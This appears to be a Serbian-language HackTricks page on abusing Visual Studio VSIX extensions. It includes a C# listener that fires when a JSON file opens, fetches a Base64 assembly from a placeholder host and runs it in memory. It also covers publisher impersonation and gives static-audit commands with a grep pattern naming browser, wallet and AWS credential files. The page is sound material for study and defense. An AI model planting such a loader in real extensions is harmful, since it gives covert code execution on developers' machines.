# Zloupotreba Visual Studio VSIX ekstenzija

{{#include ../banners/hacktricks-training.md}}

Visual Studio ekstenzija može da pretvori uobičajene aktivnosti u editoru u izvršavanje koda pod identitetom prijavljenog korisnika. Zlonamerni VSIX, izdavač koji se predstavlja kao drugi ili kompromitovano ažuriranje ekstenzije mogu da dopru do korisnika uobičajenim kanalima za instalaciju. Instalacija uz administratorski upit je putanja instalacije uz pristanak, a ne automatska eskalacija privilegija.<sup>[[1]](#references)</sup>

## Model izvršavanja

Klasične VSSDK ekstenzije obično se izvršavaju unutar `devenv.exe`. Noviji model `VisualStudio.Extensibility` prvenstveno pokreće moderne .NET ekstenzije van procesa: Visual Studio posreduje u pozivima ka namenskom procesu `Microsoft.ServiceHub.Host.Extensibility`, čime se izoluје stabilnost IDE-a, ali se **ne** postavlja sandbox koji bi ograničio ekstenziju u odnosu na Windows dozvole korisnika. Tačno ime izvršne datoteke može da sadrži sufiks arhitekture, kao što je `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Aktiviranje pri uobičajenim aktivnostima u editoru

Umesto da nudi samo upadljivu komandu u meniju, ekstenzija može da implementira `ITextViewOpenClosedListener`. Njen povratni poziv `TextViewOpenedAsync` poziva se za dokumente koji ispunjavaju uslove, dok `TextViewExtensionConfiguration.AppliesTo` može da ograniči aktivaciju na uobičajeni tip, kao što je JSON. Pravi formatter ili linter i dalje može da obavlja najavljeni posao, dok se druga radnja izvršava kao sporedni efekat otvaranja datoteke.<sup>[[1]](#references)[[3]](#references)</sup>

Sledeći pojednostavljeni obrazac prikazuje važne tačke izvršavanja; radi jasnoće izostavlja legitimni formatter i obradu grešaka.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Učitavač upravljanih sklopova u memoriji aktiviran događajem</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ovaj lanac preuzima Base64 tekst, dekodira ga u assembly bajtove, učitava ga iz `MemoryStream`-a preko sakupljivog `AssemblyLoadContext`-a, poziva reflektovani `EntryPoint` bez parametara ili sa `string[]`, čeka asinhrone ulazne tačke i oslobađa kontekst. Druga faza se ne zapisuje na disk, iako VSIX i primarni DLL ekstenzije ostaju artefakti na disku. Base64 ne pruža autentičnost ni poverljivost; korišćenje HTTP-a takođe omogućava napadaču koji presreće saobraćaj da zameni odgovor.<sup>[[1]](#references)</sup>

Operativne varijacije obuhvataju potiskivanje svih izuzetaka kako bi oglašena funkcionalnost nastavila da radi kada priprema ne uspe, ili korišćenje `ITextViewChangedListener` okidača nakon izmena. Kod se izvršava u host procesu ekstenzije i može da koristi upravljane API-je, P/Invoke, datoteke, pristupne podatke i podređene procese dostupne tom korisniku.<sup>[[1]](#references)</sup>

Za srodnu površinu za izvršavanje specifičnu za editor, zasnovanu na automatskom učitavanju nativnih dodataka, pogledajte:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Zloupotreba poverenja u Marketplace i kanale isporuke

VSIX može stići kao direktno deljena ili phishing datoteka, sa web Marketplace-a ili kroz ugrađeni Marketplace pregledač u Visual Studio-u. Registracija izdavača, koja uglavnom proverava jedinstvenost i listu rezervisanih reči, može da omogući identitete izdavača koji vizuelno podsećaju na legitimne; kompromitovanje već pouzdanog izdavača ili ekstenzije još je efikasnije jer nasleđuje postojeću bazu instaliranih korisnika. Instaliranje sa Marketplace-a pokreće Visual Studio Installer i privremeno smešta preuzeti VSIX u `%LOCALAPPDATA%\Temp`; `payload.vsix` se takođe legitimno koristi, pa samo ime datoteke nije pokazatelj.<sup>[[1]](#references)</sup>

MDSec nije identifikovao Visual Studio URL protokol koji direktno instalira ekstenziju. Operateru je i dalje potrebno da korisnik instalira ili označi VSIX kao pouzdan, ili mora da kompromituje postojeći kanal distribucije ekstenzije. Paket `AllUsers` instalira se u fasciklu instalacije Visual Studio-a i može da zatraži povišene privilegije, ali to je uobičajeno ponašanje instalacionog programa uz pristanak korisnika, a ne automatski način za dobijanje administratorskih privilegija ili SYSTEM pristupa.<sup>[[1]](#references)[[4]](#references)</sup>

### Statička revizija velikih razmera

VSIX paketi su obično ZIP kontejneri, pa bezbedan proces pregleda Marketplace-a može da izlista pakete, raspakuje ih **bez učitavanja koda ekstenzije**, obradi manifeste, identifikuje izvršne površine i dekompajlira upravljane assembly-je pomoću `ilspycmd`. Dajte prednost assembly-jima koje poseduje ekstenzija, nakon što isključite uobičajene objedinjene zavisnosti, a zatim povežite nizove koji se odnose na skladišta pristupnih podataka sa grupama ponašanja kao što su čitanje datoteka uz slanje preko mreže, kodiranje uz slanje, preuzimanje uz izvršavanje, pristup Credential Manager-u uz mrežni pristup ili snimak ekrana uz slanje.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Takođe popišite native DLL-ove, MSBuild targets, skripte, T4 templates i instalacione payload-e, umesto da pretpostavite da se sve površine za izvršavanje sastoje od managed code-a. Uporedite sumnjivo ponašanje sa svrhom navedenom u manifestu; telemetrija i legitimni programi za ažuriranje mogu ličiti na exfiltration ili staging. Pregled koji se oslanja samo na statičku analizu propušta upakovani, zamagljeni, dinamički razrešeni i neaktivni kod, a pregled samo najnovije verzije propušta zlonamerna starija izdanja.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Ponovni pregled Visual Studio ekstenzija](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - O VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomija VSIX paketa](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - .NET alat ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
